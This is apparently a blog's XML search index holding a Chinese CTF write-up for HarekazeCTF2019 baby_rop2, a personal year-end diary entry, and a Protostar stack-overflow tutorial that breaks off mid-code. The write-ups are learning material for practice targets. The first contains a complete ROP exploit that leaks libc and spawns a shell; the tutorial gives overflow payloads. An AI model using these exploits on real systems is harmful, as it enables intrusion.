<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>(HarekazeCTF2019)baby_rop2</title>
    <url>/2021/06287899.html</url>
    <content><![CDATA[<h1 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h1><p>检查保护机制，64位，开NX</p>
<p><img src="/img/image-20210628183434726.png" alt="image-20210628183434726"></p>
<p>IDA打开，查看main函数，发现buf大小为0x20,而读入的大小为0x100，存在溢出漏洞</p>
<p><img src="/img/image-20210628183509508.png" alt="image-20210628183509508"></p>
<p>再用shift+F12查找字符串，没有发现system(‘/bin/sh’)。</p>
<p><img src="/img/image-20210628185049992.png" alt="image-20210628185049992"></p>
<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>1.buf大小0x20，读入0x100，溢出漏洞，通过利用漏洞覆盖返回地址为system(‘/bin/sh’)</p>
<p>2.利用read函数，泄露libc基址，然后获取system和/bin/sh字符串的地址</p>
<p>3.最后将一二步合并完成夺权</p>
<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>泄露libc基址</p>
<p>因为printf函数中有两个参数要设置，所以就要找到rsi和rdi寄存器</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">ROPgadget <span class="token operator">-</span><span class="token operator">-</span>binary babyrop2 <span class="token operator">|</span>grep <span class="token string">"pop rdi"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/img/image-20210628202925156.png" alt="image-20210628202925156"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">ROPgadget <span class="token operator">-</span><span class="token operator">-</span>binary babyrop2 <span class="token operator">|</span>grep <span class="token string">"pop rsi"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/img/image-20210628203023369.png" alt="image-20210628203023369"></p>
<p>看见rsi后面跟有r15，我们直接设置为0</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>format_str<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_r15<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>printf_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>1.b‘a’*0x28–&gt;造成溢出，覆盖到了返回地址<br>2.p64(pop_rdi)+p64(format_str)–&gt;我们在原本语句的返回地址上写入了pop_rdi,ret，pop_rdi，对应参数format_str,执行后将formast_str的值设置给了rdi，之后执行ret（返回指令）<br>3.p64(pop_rsi_r15)+p64(read_got)+p64(0)–&gt; 我们将2中的ret写成了pop_rsi,pop_r15,ret;执行指令pop_rsi对应参数read_got,将rsi寄存器的值设置成了read函数的got表地址，pop_r15对应参数0，由于我们不用r15，随便设置一下它，我是设置成了0<br>4.p64(printf_plt)–&gt;将3中的ret设置成printf函数的plt表地址，实际上就是printf函数的地址，去执行printf函数，输出我们设置的read函数的地址<br>5.p64(main_addr)–&gt; 在完成第一次利用后，得到了程序内read函数的地址，知道了libc基址，我们需要重新回到程序开头，再次利用这个输入点去写入system‘（/bin/sh）’</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">read_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python">libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'read'</span><span class="token punctuation">,</span> read_addr<span class="token punctuation">)</span>  <span class="token comment">#利用libcsearcher库去查找匹配的libc版本</span>
libc_base <span class="token operator">=</span> read_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'read'</span><span class="token punctuation">)</span>  <span class="token comment">#计算程序里的偏移量</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>计算system和(‘/bin/sh’)的地址</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">sys_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
bin_sh <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>


<span class="token comment">#p = process('./babyrop2')</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node3.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">29233</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'babyrop2'</span><span class="token punctuation">)</span>

pop_rdi <span class="token operator">=</span> <span class="token number">0x400733</span>
pop_rsi_r15 <span class="token operator">=</span> <span class="token number">0x400731</span> 
format_str <span class="token operator">=</span> <span class="token number">0x400770</span>  <span class="token comment">#%s所在字符串</span>
ret_addr <span class="token operator">=</span> <span class="token number">0x400734</span>

printf_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>
read_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
main_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>

payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>format_str<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_r15<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>printf_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_plt<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name? "</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

read_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'read'</span><span class="token punctuation">,</span> read_addr<span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> read_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'read'</span><span class="token punctuation">)</span>

sys_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
bin_sh <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最后拿flag时，发现flag还没有放在根目录下，需要find -name “flag”去查找，最后cat flag</p>
<p><img src="/img/image-20210628210723648.png" alt="image-20210628210723648"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>2024年末总结</title>
    <url>/2025/01068829.html</url>
    <content><![CDATA[<h1 id="2024年末总结-2025-1-6-0-59起笔"><a href="#2024年末总结-2025-1-6-0-59起笔" class="headerlink" title="2024年末总结(2025-1-6-0:59起笔)"></a>2024年末总结<del>(2025-1-6-0:59起笔)</del></h1><p>按照中国的农历来算，离春节还有23天，想了想，是时候做一个2024年的年终总结了。</p>
<p>当然不是写给大家看，只是写给自己。</p>
<p>不用管我文笔，本来理工男也不会有什么好文笔(yzy除外)，就记个流水账，嗯。</p>
<p>今年，不对，应该说去年了，毕竟元旦已经过了好几天，是相当难忘的一整年，主要是在痛苦中度过，但也不乏有美好的回忆。美好有二，一是和宿舍兄弟们一起毕业旅行新疆阿勒泰和赛里木湖，记得很清楚出发的那天是2024年5月25日，现在想起来也觉得激动，太多第一次在那一趟旅途中实现，这辈子都会怀念，毕竟青春只有一次，永远没法复刻。二呢就是和父母自驾318小环线，穷游打卡，在子梅垭口拍到不完整的贡嘎雪山，人生一样，不完美才是完美，我没有拍到我日思夜想的日照金山，那天雾很大，它好像故意躲着我，就像我曾经喜欢的女孩老是忽远忽近，搞得我高兴又难过。But，这个话题不宜多说。</p>
<p>这一年，我大学毕业了，面临了所有毕业生都会面临的问题，就业。</p>
<p>就业对我来说，很难评。当然我是不想当牛马的，但是如果是做我自己想做的事，那其实算不上牛马，在我的理解里面是这样的的。我没有急着投简历、面试，我在想，我应该先沉淀自己，没错。这很重要，和修高楼一个道理，不用我多说，地基必须打好，楼才能修得高，所以我选择先打地基。因为我的目标是从事我喜欢的这个专业的工作，但我深知大学里屁都没学到，实话，没有说学校不好，只是大学普遍性教学的弊端，仅此而已。所以我只能现在花时间自己学，自己琢磨。我爹总说，先上班，接触更多的业内大佬，你才有机会更快进步，但你不知道，我得先达到那个水平才有机会接触业内大佬，就像扫地工人难道不努力往上爬这辈子就能和千万富翁谈上话吗？得有敲门砖。所以没办法，不理解就不理解吧，我得犟一次，只是想做我真正想做的事。我觉得我的计划没太大问题，先沉淀，然后到一定水平足够让一些好公司看上我时就去投简历，然后开始工作，接着学习进步。我真的觉得不能急，现在这个社会是很病态的，“内卷”严重，什么都卷，什么都急，快餐时代，有多少人还能慢下脚步来欣赏美好，说真的，我的观念就是人活一世，至少活成自己想要的样子。不要随波逐流，考公热就考公，考研卷就考研，做自己想做的事情难道违法？！真的搞不懂，我觉得我这一年之所以觉得痛苦，就是太多push，太多被迫选择，浪费了时间，还没有正向收获，不过还好后面反应过来，开始坚定自己的道路走。</p>
<p>说到快餐时代，很想痛骂当代爱情观，简直就是一坨屎，什么都图新鲜，谈个恋爱新鲜感一过，说散就散，完全就是神经病！我讲真的，别说什么真心付出过就够了，那每个人性格不同，我就是长情(说难听点sb恋爱脑)，我能怎么办，只能说遇人不淑。恋爱不是这么谈的，婚姻也不是！说实话我觉得中国传统的包办婚姻是存在一定问题，但是好在那时候的感情很真，很纯。这就不得不搬出那句超级老的话：从前，车马很慢，书信很远，一生只够爱一个人。你可以骂我古板，但是我就是觉得这是对的。那三天两头换对象，像个啥？玩玩具呢，玩腻了买新的，我***！还有嗷，现在的人，换得快就算了，还喜欢多线程，我真™无语！感情不值钱了，无论是在爱情方面还是交朋友方面，这我没办法，只能逼自己改变: (</p>
<p>哦对，年终总结呢，光发牢骚了，其实，这一年就是挫折中成长，逆境中重生，最后总是在往前走的。而且我看了下，走得应该还不少，顺利毕业了，减重了，也挖到洞了，不错不错，来年再接再厉！</p>
<p>行吧，被你看出来了，其实没想总结，只是想发发牢骚，哈哈哈哈！就这样吧，闭了。</p>
<p>​                                                                                                                                                    ——  2025-1-6-1:38</p>
]]></content>
      <categories>
        <category>日常闲话</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn-protostar靶场2 stack one，stack two</title>
    <url>/2024/11122500.html</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="Pwn-protostar靶场2-stack-one，stack-two"><a href="#Pwn-protostar靶场2-stack-one，stack-two" class="headerlink" title="Pwn-protostar靶场2 stack one，stack two"></a>Pwn-protostar靶场2 stack one，stack two</h1><h3 id="什么是缓冲区溢出"><a href="#什么是缓冲区溢出" class="headerlink" title="什么是缓冲区溢出"></a>什么是<strong>缓冲区溢出</strong></h3><p>当系统<strong>向缓冲区写入的数据多于它可以容纳的数据时</strong>，就会发生缓冲区溢出或缓冲区溢出，用更简单的话说就是在程序运行时，系统会为程序在内存里<strong>生成一个固定空间</strong>，如果超过了这个空间，就会造成缓冲区溢出，可以导致程序运行失败、系统宕机、重新启动等后果。更为严重的是，甚至可以取得系统特权，进而进行各种非法操作</p>
<h3 id="什么是寄存器"><a href="#什么是寄存器" class="headerlink" title="什么是寄存器"></a>什么是寄存器</h3><p>寄存器是内存中非常靠近cpu的区域，因此可以快速访问它们，但是在这些寄存器里面能存储的东西非常有限</p>
<p>计算机寄存器是位于CPU内部的一组用于存储和处理数据的高速存储器。用于存放指令、数据和运算结果</p>
<p>常见的寄存器名称以及作用：</p>
<pre class="line-numbers language-none"><code class="language-none">累加器寄存器（Accumulator Register，EAX）：用于存储操作数和运算结果，在算术和逻辑操作中经常使用。

基址指针寄存器（Base Pointer Register，EBP）：用于指向堆栈帧的基地址，通常用于函数调用和局部变量访问。

堆栈指针寄存器（Stack Pointer Register，ESP）：指向当前活动堆栈的栈顶地址，在函数调用和参数传递中经常使用。

数据寄存器（Data Register，EDX、ECX、EBX）：用于存储数据，在算术和逻辑操作中经常使用。

指令指针寄存器（Instruction Pointer Register，EIP）：存储当前要执行的指令的内存地址，用于指示下一条要执行的指令。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="Stack-One"><a href="#Stack-One" class="headerlink" title="Stack One"></a>Stack One</h2><h3 id="程序静态分析"><a href="#程序静态分析" class="headerlink" title="程序静态分析"></a>程序静态分析</h3><p>stack one源码：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">volatile</span> <span class="token keyword">int</span> modified<span class="token punctuation">;</span>
  <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span><span class="token punctuation">(</span>argc <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token function">errx</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"please specify an argument\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  modified <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">strcpy</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span><span class="token punctuation">(</span>modified <span class="token operator">==</span> <span class="token number">0x61626364</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"you have correctly got the variable to the right value\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Try again, you got 0x%08x\n"</span><span class="token punctuation">,</span> modified<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="源代码分析"><a href="#源代码分析" class="headerlink" title="源代码分析"></a>源代码分析</h4><p>首先程序定义了两个函数变量</p>
<pre class="line-numbers language-none"><code class="language-none">volatile int modified;
char buffer[64];<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>整数型变量 modified 和字符型变量buffer，其中字符型变量buffer的字符存储最大为64个字节，然后程序检测了我们输入的参数</p>
<pre class="line-numbers language-none"><code class="language-none">if(argc &#x3D;&#x3D; 1) &#123;
    errx(1, &quot;please specify an argument\n&quot;);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>如果我们只运行程序，不输入参数就会输出please specify an argument并结束程序</p>
<p>之后程序定义了一个变量和进行了一个字符串复制操作</p>
<pre class="line-numbers language-none"><code class="language-none">modified &#x3D; 0;
strcpy(buffer, argv[1]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>modified变量为0，然后将我们输入的参数复制到buffer变量里</p>
<p>然后程序做了一个简单的if判断</p>
<pre class="line-numbers language-none"><code class="language-none">if(modified &#x3D;&#x3D; 0x61626364) &#123;
    printf(&quot;you have correctly got the variable to the right value\n&quot;);
&#125; else &#123;
    printf(&quot;Try again, you got 0x%08x\n&quot;, modified);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>如果modified变量等于0x61626364就输出you have correctly got the variable to the right value，代表着我们破解成功<br>0x61626364是十六进制，转换字符串是abcd</p>
<p>也就是说，我们使modified变量变成abcd就成功了，但是modified变量设置为0，这里我们就需要栈溢出覆盖变量原本设置的值 </p>
<h4 id="汇编分析"><a href="#汇编分析" class="headerlink" title="汇编分析"></a>汇编分析</h4><p>使用gdb打开程序，输入指令查看汇编代码</p>
<pre class="line-numbers language-none"><code class="language-none">set disassembly-flavor intel
disassemble main<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/img/1731309891684.png"></p>
<pre class="line-numbers language-none"><code class="language-none">0x08048464 &lt;main+0&gt;:    push   ebp
0x08048465 &lt;main+1&gt;:    mov    ebp,esp
0x08048467 &lt;main+3&gt;:    and    esp,0xfffffff0
0x0804846a &lt;main+6&gt;:    sub    esp,0x60
0x0804846d &lt;main+9&gt;:    cmp    DWORD PTR [ebp+0x8],0x1
0x08048471 &lt;main+13&gt;:   jne    0x8048487 &lt;main+35&gt;
0x08048473 &lt;main+15&gt;:   mov    DWORD PTR [esp+0x4],0x80485a0
0x0804847b &lt;main+23&gt;:   mov    DWORD PTR [esp],0x1
0x08048482 &lt;main+30&gt;:   call   0x8048388 &lt;errx@plt&gt;
0x08048487 &lt;main+35&gt;:   mov    DWORD PTR [esp+0x5c],0x0
0x0804848f &lt;main+43&gt;:   mov    eax,DWORD PTR [ebp+0xc]
0x08048492 &lt;main+46&gt;:   add    eax,0x4
0x08048495 &lt;main+49&gt;:   mov    eax,DWORD PTR [eax]
0x08048497 &lt;main+51&gt;:   mov    DWORD PTR [esp+0x4],eax
0x0804849b &lt;main+55&gt;:   lea    eax,[esp+0x1c]
0x0804849f &lt;main+59&gt;:   mov    DWORD PTR [esp],eax
0x080484a2 &lt;main+62&gt;:   call   0x8048368 &lt;strcpy@plt&gt;
0x080484a7 &lt;main+67&gt;:   mov    eax,DWORD PTR [esp+0x5c]
0x080484ab &lt;main+71&gt;:   cmp    eax,0x61626364
0x080484b0 &lt;main+76&gt;:   jne    0x80484c0 &lt;main+92&gt;
0x080484b2 &lt;main+78&gt;:   mov    DWORD PTR [esp],0x80485bc
0x080484b9 &lt;main+85&gt;:   call   0x8048398 &lt;puts@plt&gt;
0x080484be &lt;main+90&gt;:   jmp    0x80484d5 &lt;main+113&gt;
0x080484c0 &lt;main+92&gt;:   mov    edx,DWORD PTR [esp+0x5c]
0x080484c4 &lt;main+96&gt;:   mov    eax,0x80485f3
0x080484c9 &lt;main+101&gt;:  mov    DWORD PTR [esp+0x4],edx
0x080484cd &lt;main+105&gt;:  mov    DWORD PTR [esp],eax
0x080484d0 &lt;main+108&gt;:  call   0x8048378 &lt;printf@plt&gt;
0x080484d5 &lt;main+113&gt;:  leave
0x080484d6 &lt;main+114&gt;:  ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> 程序最关键的地方在这里 </p>
<pre class="line-numbers language-none"><code class="language-none">0x080484a7 &lt;main+67&gt;:   mov    eax,DWORD PTR [esp+0x5c]
0x080484ab &lt;main+71&gt;:   cmp    eax,0x61626364
0x080484b0 &lt;main+76&gt;:   jne    0x80484c0 &lt;main+92&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>它使用mov指令将esp+0x5c栈内地址的值移动到eax寄存器里，然后用cmp指令将eax寄存器里的值与0x61626364做对比，如果对比的值不一样就执行jne指令跳转到0x80484c0地址继续执行其他指令 </p>
<h3 id="程序动态分析"><a href="#程序动态分析" class="headerlink" title="程序动态分析"></a>程序动态分析</h3><p>我们先在程序执行对比指令的地址下一个断点</p>
<pre class="line-numbers language-none"><code class="language-none">b *0x080484ab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p> 然后设置一下自动运行我们设置的命令 </p>
<pre class="line-numbers language-none"><code class="language-none">define hook-stop
info registers   &#x2F;&#x2F;显示寄存器里的地址
x&#x2F;24wx $esp      &#x2F;&#x2F;显示esp寄存器里的内容
x&#x2F;2i $eip        &#x2F;&#x2F;显示eip寄存器里的内容
end              &#x2F;&#x2F;结束<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/img/1731310142307.png"></p>
<p>然后执行程序，输入参数</p>
<pre class="line-numbers language-none"><code class="language-none">r aaaaaaaa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/img/1731310302953.png"></p>
<p>程序执行到我们设置的断点处自动执行了我们上面设置的命令，在这里可以看到我们输入的8个大写A在栈中的位置，并且eax寄存器里的值为0</p>
<p>之前说过，程序将esp+0x5c地址处的值移动到了eax寄存器里，然后执行对比指令</p>
<p> 我们查看esp+0x5c地址存放的值 </p>
<pre class="line-numbers language-none"><code class="language-none">x&#x2F;wx $esp+0x5c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/img/1731310378730.png"></p>
<p> esp+0x5c地址就是栈里的0xbffff78c，每一段存放四个字符，c代表的是12 </p>
<p>从存放我们输入的值的栈地址到esp+0x5c，中间共有64个字符，也就是说，我们需要输出64个字符+4个我们指定的字符才能覆盖modified变量 </p>
<p><strong>在这里还有一个知识点是在x86架构里，读取是由低到高的，要使modified变量变成0x61626364，不能直接输入abcd，而是dcba</strong></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">"print('a'*(4*16)+'dcba')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/img/1731310551190.png"></p>
<p>成功破解！</p>
<h2 id="Stack-Two"><a href="#Stack-Two" class="headerlink" title="Stack Two"></a>Stack Two</h2><h3 id="程序静态分析-1"><a href="#程序静态分析-1" class="headerlink" title="程序静态分析"></a>程序静态分析</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">volatile</span> <span class="token keyword">int</span> modified<span class="token punctuation">;</span>
  <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>variable<span class="token punctuation">;</span>

  variable <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"GREENIE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span><span class="token punctuation">(</span>variable <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token function">errx</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"please set the GREENIE environment variable\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  modified <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

  <span class="token function">strcpy</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> variable<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span><span class="token punctuation">(</span>modified <span class="token operator">==</span> <span class="token number">0x0d0a0d0a</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"you have correctly modified the variable\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Try again, you got 0x%08x\n"</span><span class="token punctuation">,</span> modified<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

